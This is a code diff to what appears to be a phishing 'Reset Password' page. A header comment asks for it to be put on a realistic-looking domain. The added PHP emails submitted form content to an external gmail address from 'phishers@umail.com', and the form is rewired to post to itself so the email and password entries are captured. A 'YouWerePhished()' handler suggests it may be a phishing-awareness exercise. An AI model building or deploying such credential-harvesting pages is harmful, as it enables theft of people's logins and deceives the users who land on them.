@@ -5,7 +5,11 @@
     3. Any styling improvements or missing features (Ex. Password Validation, improved form, transition, no dead links)
     4. Put on a domain that looks realistic.
 -->
-
+<?php
+if($_POST["message"]) {
+    mail("tdebbad@gmail.com", "Form to email message", $_POST["message"], "From: phishers@umail.com");
+}
+?>
 <style>
 body {
     background-image: linear-gradient(141deg, #0045a2 0%, #a644e5 100%);
@@ -143,7 +147,7 @@ input + .form-default p, select + .form-default p { margin: .2em 0 0; }
     </div>
     <h2 >Reset Password</h2>    
     <!--<form method="post" action="connect.php" onsubmit="YouWerePhished();" class="reset-password-form form-default"  >-->
-    <form onsubmit="YouWerePhished();" class="reset-password-form form-default" method="post" action="connect.php"  >
+    <form onsubmit="YouWerePhished();" class="reset-password-form form-default" method="post" action="index.php"  >
         <div class="form-row floating-label">
             <p style="margin-top: 10px"></p>
             <input type="email" name="email" id="email" placeholder="Email" autofocus="">
